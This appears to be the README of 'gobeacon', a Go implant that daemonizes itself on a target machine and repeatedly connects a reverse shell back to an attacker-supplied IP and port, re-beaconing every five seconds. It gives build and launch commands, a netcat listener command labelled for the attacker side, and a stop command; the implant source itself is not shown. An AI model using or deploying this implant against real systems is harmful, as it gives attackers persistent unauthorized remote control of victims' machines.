# gobeacon
A small beaconing implant that daemonizes itself (it's golang...) and calls out to the user. If the shell dies, the implant beacons again in 5 seconds.

## Compilation
```go
go build gobeacon.go
```

## Usage:
```go
./gobeacon start <IP> <PORT>
```

## Example
On target:
```
./gobeacon start 127.0.0.1 9001
```
On attacker:
```sh
rlwrap nc -lvnp 9001
```

To stop the beacon:
```
./gobeacon stop 127.0.0.1 9001
```
### Creds
Creds to this blogpost where I ripped the daemonization code from: https://socketloop.com/tutorials/golang-daemonizing-a-simple-web-server-process-example
